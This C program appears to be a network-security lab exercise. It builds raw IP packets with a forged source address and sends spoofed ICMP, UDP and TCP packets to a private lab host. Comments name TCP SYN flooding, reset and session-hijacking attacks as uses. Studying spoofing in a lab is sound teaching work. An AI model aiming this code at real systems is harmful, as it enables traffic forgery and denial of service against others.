#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <time.h>

#include "headers.h"



#define SRC_IP     "1.2.3.4"
#define DEST_IP    "10.0.2.15"
#define SRC_PORT   42433
#define DEST_PORT  9090 
#define SEQ_NUM    3092566627
#define TCP_DATA   "Hello Server!"

/*********************
  Given an IP packet, send it out using a raw socket.
**********************/
void send_raw_ip_packet(struct ipheader* ip)
{
    struct sockaddr_in dest_info;
    int enable = 1;

    // Step 1: Create a raw network socket.
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    // Step 2: Set socket option.
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
                     &enable, sizeof(enable));

    // Step 3: Provide needed information about destination.
    dest_info.sin_family = AF_INET;
    dest_info.sin_addr = ip->iph_destip;

    // Step 4: Send the packet out.
    sendto(sock, ip, ntohs(ip->iph_len), 0,
           (struct sockaddr *)&dest_info, sizeof(dest_info));
    close(sock);
}




unsigned short in_cksum (unsigned short *buf, int length);
/**********************
  Spoof an ICMP echo request using an arbitrary source IP Address
***********************/
int icmpF() {
   char buffer[1024];

   memset(buffer, 0, 1024);

   /*******************
      Step 1: Fill in the ICMP header.
    ********************/
   struct icmpheader *icmp = (struct icmpheader *)
                             (buffer + sizeof(struct ipheader));
   icmp->icmp_type = 8; //ICMP Type: 8 is request, 0 is reply.

   // Calculate the checksum for integrity
   icmp->icmp_chksum = 0;
   icmp->icmp_chksum = in_cksum((unsigned short *)icmp,
                                 sizeof(struct icmpheader));

   /*******************
      Step 2: Fill in the IP header.
    ********************/
   struct ipheader *ip = (struct ipheader *) buffer;
   ip->iph_ver = 4;
   ip->iph_ihl = 5;
   ip->iph_ttl = 20;
   ip->iph_sourceip.s_addr = inet_addr(SRC_IP);
   ip->iph_destip.s_addr = inet_addr(DEST_IP);
   ip->iph_protocol = IPPROTO_ICMP;
   ip->iph_len = htons(sizeof(struct ipheader) +
                       sizeof(struct icmpheader));

   /*******************
      Step 3: Finally, send the spoofed packet
    ********************/
   send_raw_ip_packet (ip);

   return 0;
}





int udpF() {
   char buffer[1024];

   memset(buffer, 0, 1024);
   struct ipheader *ip = (struct ipheader *) buffer;
   struct udpheader *udp = (struct udpheader *) (buffer +
                                          sizeof(struct ipheader));

   /*******************
      Step 1: Fill in the UDP data field.
    ********************/
   char *data = buffer + sizeof(struct ipheader) +
                         sizeof(struct udpheader);
   const char *msg = "Hello Server!\n";
   int data_len = strlen(msg);
   strncpy (data, msg, data_len);

   /*******************
      Step 2: Fill in the UDP header.
    ********************/
   udp->udp_sport = htons(12345);
   udp->udp_dport = htons(9090);
   udp->udp_ulen = htons(sizeof(struct udpheader) + data_len);
   udp->udp_sum =  0; /* Many OSes ignore this field, so we do not
                         calculate it. */

   /*******************
      Step 3: Fill in the IP header.
    ********************/
   ip->iph_ver = 4;
   ip->iph_ihl = 5;
   ip->iph_ttl = 20;
   ip->iph_sourceip.s_addr = inet_addr(SRC_IP);
   ip->iph_destip.s_addr = inet_addr(DEST_IP);
   ip->iph_protocol = IPPROTO_UDP; // The value is 17.
   ip->iph_len = htons(sizeof(struct ipheader) +
                       sizeof(struct udpheader) + data_len);

   /*******************
      Step 4: Finally, send the spoofed packet
    ********************/
   send_raw_ip_packet (ip);

   return 0;
}






unsigned short calculate_tcp_checksum(struct ipheader *ip);


/**********************
  Spoof a TCP packet. Can be used for the following attacks: 
              --- TCP SYN Flooding Attack
              --- TCP Reset Attack
              --- TCP Session Hijacking Attack
***********************/
int tcpF() {		
   char buffer[2000];

   srand(time(0)); // We need to use random numbers for some attacks
	
   memset(buffer, 0, 2000);

   struct ipheader *ip = (struct ipheader *) buffer;
   struct tcpheader *tcp = (struct tcpheader *) (buffer + sizeof(struct ipheader));

   /*******************
      Step 1: Fill in the TCP data field.
    ********************/
   char *data = buffer + sizeof(struct ipheader) + sizeof(struct tcpheader);
   const char *msg = TCP_DATA;
   int data_len = strlen(msg);
   strncpy (data, msg, data_len); 


   /*******************
      Step 2: Fill in the TCP header.
    ********************/
   tcp->tcp_sport = htons(SRC_PORT);
   tcp->tcp_dport = htons(DEST_PORT); 
   tcp->tcp_seq = htonl(SEQ_NUM);
   tcp->tcp_offx2 = 0x50;
   tcp->tcp_flags = 0x00;
   tcp->tcp_win =  htons(20000); 
   tcp->tcp_sum =  0;

   /*******************
      Step 3: Fill in the IP header.
    ********************/
   ip->iph_ver = 4;   // Version (IPV4)
   ip->iph_ihl = 5;   // Header length
   ip->iph_ttl = 20;  // Time to live 
   //  ip->iph_sourceip.s_addr = rand(); // Use a random IP address 
   ip->iph_sourceip.s_addr = inet_addr(SRC_IP); // Source IP
   ip->iph_destip.s_addr = inet_addr(DEST_IP);  // Dest IP
   ip->iph_protocol = IPPROTO_TCP; // The value is 6.
   ip->iph_len = htons(sizeof(struct ipheader) + sizeof(struct tcpheader) + data_len);

   // Calculate tcp checksum here, as the checksum includes some part of the IP header
   tcp->tcp_sum = calculate_tcp_checksum(ip); 
	
   // No need to fill in the following fileds, as they will be set by the system.
   // ip->iph_chksum = ...

   /*******************
      Step 4: Finally, send the spoofed packet
    ********************/
   send_raw_ip_packet(ip); 

   return 0;
}





int main(){

  icmpF();
  udpF();
  tcpF();
  return 0;
}













